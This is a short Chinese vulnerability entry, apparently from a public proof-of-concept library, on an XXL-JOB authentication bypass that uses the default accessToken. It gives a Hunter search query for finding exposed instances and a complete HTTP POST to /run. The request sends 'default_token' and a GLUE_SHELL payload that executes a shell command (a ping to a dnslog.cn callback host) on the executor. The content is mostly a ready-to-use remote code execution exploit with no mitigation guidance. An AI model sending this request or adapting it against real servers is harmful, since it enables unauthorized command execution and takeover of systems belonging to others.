# XXL-JOB默认accessToken权限绕过漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);"> XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">XXL-JOB</font>

# <font style="color:rgb(0, 0, 0);">三、资产测绘</font>
+ hunter`app.name="XXL-JOB"`
+ 特征

# 四、漏洞复现
```plain
POST /run HTTP/1.1
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
User-Agent: Java/1.8.0_391
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 323
Connection: close

{"jobId": 287040,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0,"logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "ping 0n3fio.dnslog.cn","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ixd973mksvmz9c3w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
